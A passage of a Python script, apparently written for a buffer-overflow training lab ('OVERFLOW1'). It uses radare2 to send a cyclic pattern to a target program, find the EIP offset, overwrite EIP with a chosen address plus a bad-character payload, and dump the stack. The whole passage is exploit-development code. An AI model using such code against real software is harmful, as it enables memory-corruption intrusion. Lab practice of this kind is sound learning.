...
pattern = pattern_gen(2000)

thread_expl = threading.Thread(target=expl, args=("OVERFLOW1   ", pattern,"","",""))
thread_program2 = threading.Thread(target=test_func, args=(r2,))

thread_program2.start()
thread_expl.start()
thread_expl.join()
thread_program2.join()

r2.cmd("dr eip")
eip_str = r2.cmd("")
eip_lit = literal_eval(eip_str)
eip = int(eip_lit)
print("eip_lit after pattern: ", hex(eip_lit))

my_offset = pattern_search(eip_str)

print("Gonna try to override eip register with '\\x83\\x66\\x52\\x56', offset: ", my_offset)
new_eip = "\x83\x66\x52\x56"
r2.cmd("ood")
r2.cmd("")
time.sleep(2)


thread_expl2 = threading.Thread(target=expl, args=("OVERFLOW1  ", my_offset*"A",new_eip,badchars,""))
thread_program3 = threading.Thread(target=test_func, args=(r2,))

thread_program3.start()
thread_expl2.start()
thread_expl2.join()
thread_program3.join()

r2.cmd("dr eip")
eip_str = r2.cmd("")
eip_lit = literal_eval(eip_str)
eip = int(eip_lit)
print("Final eip register: ", hex(eip_lit))


r2.cmd("pxq @ rsp")
eip_str = r2.cmd("")
print("Final rsp dumped: ", eip_str)
print("Final rsp dumped: ", type(eip_str))
print("Final rsp dumped: ", eip_str.split(" "))
"""
#rsp registerini dump etme lazim
#pxQ @ rsp
